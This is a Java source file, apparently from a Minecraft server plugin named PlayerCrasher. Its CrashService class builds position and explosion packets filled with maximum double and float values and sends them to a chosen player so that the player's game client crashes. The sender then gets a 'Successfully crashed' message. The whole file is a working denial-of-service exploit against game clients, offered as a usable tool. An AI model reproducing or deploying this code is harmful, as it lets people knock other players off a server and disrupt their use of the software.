package com.deathmotion.playercrasher.services;

import com.deathmotion.playercrasher.PlayerCrasher;
import com.deathmotion.playercrasher.enums.CrashMethod;
import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientPlayerPosition;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import net.kyori.adventure.platform.bukkit.BukkitAudiences;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Consumer;

public class CrashService {
    private final BukkitAudiences adventure;
    private final WrapperPlayClientPlayerPosition positionPacket;
    private final WrapperPlayServerExplosion explosionPacket;
    private Map<CrashMethod, Consumer<Player>> crashMethodActions;

    public CrashService(PlayerCrasher plugin) {
        this.adventure = plugin.getAdventure();
        this.initCrashMethodActions();

        this.positionPacket = initPositionPacket();
        this.explosionPacket = initExplosionPacket();
    }

    public void crashPlayer(CommandSender sender, Player target, CrashMethod method) {
        Consumer<Player> action = crashMethodActions.get(method);
        action.accept(target);

        adventure.sender(sender).sendMessage(Component.text("Successfully crashed " + target.getName(), NamedTextColor.GREEN));
    }

    private void sendPositionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, positionPacket);
    }

    private void sendExplosionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, explosionPacket);
    }

    private void initCrashMethodActions() {
        this.crashMethodActions = new HashMap<>();
        this.crashMethodActions.put(CrashMethod.POSITION, this::sendPositionPacket);
        this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
    }

    private WrapperPlayClientPlayerPosition initPositionPacket() {
        Vector3d vector = new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
        return new WrapperPlayClientPlayerPosition(vector, false);
    }

    private WrapperPlayServerExplosion initExplosionPacket() {
        Vector3d position = new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
        float strength = Float.MAX_VALUE;
        return new WrapperPlayServerExplosion(position, strength, Collections.emptyList(), new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
    }
}